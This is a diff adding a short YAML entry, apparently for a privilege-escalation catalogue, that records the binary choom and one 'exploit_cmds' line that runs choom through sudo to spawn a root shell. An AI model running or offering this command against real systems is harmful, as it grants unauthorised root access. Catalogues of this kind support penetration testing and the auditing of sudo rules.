@@ -1,0 +1,4 @@
+name: choom
+binary_path: /usr/bin/choom
+exploit_cmds:
+- sudo /usr/bin/choom -n 0 /bin/sh
